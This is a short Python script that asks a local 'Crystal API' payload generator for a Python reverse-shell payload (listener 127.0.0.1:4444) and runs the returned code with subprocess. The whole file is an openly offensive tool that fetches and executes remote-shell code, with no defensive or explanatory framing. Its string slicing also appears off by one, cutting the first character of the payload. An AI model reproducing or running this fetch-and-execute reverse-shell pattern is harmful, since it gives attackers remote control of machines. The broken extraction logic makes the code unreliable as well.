import requests
import json
import subprocess

def run_reverse_shell():
    """
    Fetches a Python reverse shell payload from the Crystal API and executes it.
    """
    try:
        # Request the payload from the API
        response = requests.post(
            'http://127.0.0.1:5000/api/payload/generate',
            json={'type': 'python_reverse_shell', 'lhost': '127.0.0.1', 'lport': 4444}
        )
        response.raise_for_status()

        # Extract the payload from the JSON response
        payload_data = response.json()
        full_payload_command = payload_data.get('payload')

        if not full_payload_command:
            print("Error: Could not retrieve payload from the API response.")
            return

        # The payload is in the format "python -c '...code...'"
        # We need to extract the code part.
        if full_payload_command.startswith("python -c '") and full_payload_command.endswith("'"):
            code_to_execute = full_payload_command[12:-1]

            # Execute the code in a new process
            subprocess.run(['python', '-c', code_to_execute])
        else:
            print(f"Error: Unexpected payload format: {full_payload_command}")

    except requests.exceptions.RequestException as e:
        print(f"Error connecting to the Crystal API: {e}")
    except json.JSONDecodeError:
        print("Error: Failed to decode JSON from the API response.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

if __name__ == '__main__':
    run_reverse_shell()
